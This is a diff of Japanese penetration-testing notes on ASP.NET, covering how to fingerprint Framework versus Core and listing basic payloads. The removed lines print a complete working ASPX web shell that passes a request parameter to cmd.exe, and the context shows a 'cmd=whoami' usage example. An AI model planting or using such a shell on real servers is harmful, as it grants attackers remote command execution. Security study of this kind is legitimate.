@@ -407,39 +407,19 @@ echo "Public key added successfully!";
 
 - HTTPレスポンスヘッダ:
     - `X-Powered-By: ASP.NET`：ASP.NET が動いている証拠
-    - `X-AspNet-Version`: これがあれば旧世代（Framework）、なければ新世代（Core系）の可能性
+    - `X-AspNet-Version`: これがあれば旧世代（Framework）、なければ新世代（Core系）の可能性がある
 - URLの拡張子:
     - `.aspx` あり：旧世代（Framework）
     - なし：新世代（Core以降）のルーティング機能
 - ファイル構成:
     - `web.config` のみ：旧世代（framework）
-    - `appsettings.json` や `*.dll` が大量にある：新世代（Core系）
+    - `appsettings.json` や 大量の`*.dll` がある：新世代（Core系）
 
 ### 基本 ペイロード
 
 #### Web shell 
 
-- Payload
-	- [cmdexec.aspx - GitHub](https://github.com/tennc/webshell/blob/master/aspx/asp.net-backdoors/cmdexec.aspx)
-	- `/use/share/webshells/aspx/cmd.aspx`
-```aspx
-<%@ Page Language="C#" %>
-<%
-Response.Write(
-    new System.IO.StreamReader(
-        new System.Diagnostics.Process(){
-            StartInfo = new System.Diagnostics.ProcessStartInfo(){
-                FileName="cmd.exe",
-                Arguments="/c " + Request["cmd"],
-                RedirectStandardOutput=true,
-                UseShellExecute=false,
-                CreateNoWindow=true
-            }
-        }.Start().StandardOutput.BaseStream
-    ).ReadToEnd()
-);
-%>
-```
+- Payload：[cmdexec.aspx - GitHub](https://github.com/tennc/webshell/blob/master/aspx/asp.net-backdoors/cmdexec.aspx)（`/use/share/webshells/aspx/cmd.aspx`）
 実行例
 ```
 http://target/shell.aspx?cmd=whoami
